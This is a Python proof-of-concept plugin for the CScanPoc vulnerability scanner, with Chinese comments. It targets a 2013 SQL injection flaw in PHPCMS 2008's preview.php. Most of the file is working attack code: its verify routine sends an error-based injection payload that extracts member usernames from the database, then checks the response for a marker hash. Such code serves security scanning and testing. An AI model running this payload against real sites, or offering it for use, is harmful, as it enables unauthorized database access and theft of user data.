# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse

class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0030_L' # 平台漏洞编号，留空
    name = 'PHPCMS 2008 SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2013-04-18'  # 漏洞公布时间
    desc = '''
        PHPCMS 2008 在preview.php 参数未过滤导致SQL注入漏洞。
    ''' # 漏洞描述
    ref = 'http://0day5.com/archives/985/' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = 'PHPCMS 2008'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'e05a5207-f7b8-4a83-b0f3-fd752ab917dc'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-14' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #注入前请先注册一个用户，把登陆后的cookie写入到cookie变量中。
            s = requests.session()
            s.get(self.target)
            o = urlparse.urlparse(self.target)
            payload = '/phpcms/preview.php'
            parms = "?info[catid]=15&content=a[page]b&info[contentid]=2' and (select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,username,0x3a,md5(c),0x27,0x7e) from phpcms_member limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)-- a"
            url = 'http://' + o.hostname + payload + parms
            r = s.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()